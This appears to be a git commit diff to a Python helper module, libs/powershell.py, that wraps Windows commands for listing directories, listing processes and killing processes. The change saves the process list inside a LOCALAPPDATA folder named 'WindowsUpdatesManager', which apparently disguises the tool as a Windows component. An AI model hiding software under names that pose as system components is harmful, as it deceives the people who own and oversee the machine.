7d81329e49c93a79e4f0f35e9a9a510412fbe571
richa-z <145004550+richa-z@users.noreply.github.com>
2024-01-31 08:26:34 +0100

    Update paths

--- libs/powershell.py
+++ libs/powershell.py
@@ -4,7 +4,7 @@ def dir(directory):
     return str(os.listdir(directory))
 
 def tasklist():
-    os.popen("tasklist > tasklist.txt")
+    os.popen(f"tasklist > {os.getenv("LOCALAPPDATA")}WindowsUpdatesManager/Snky-main/tasklist.txt")
     
 def taskkill(process):
     if os.popen(f"taskkill /im {process} /f") == 0:
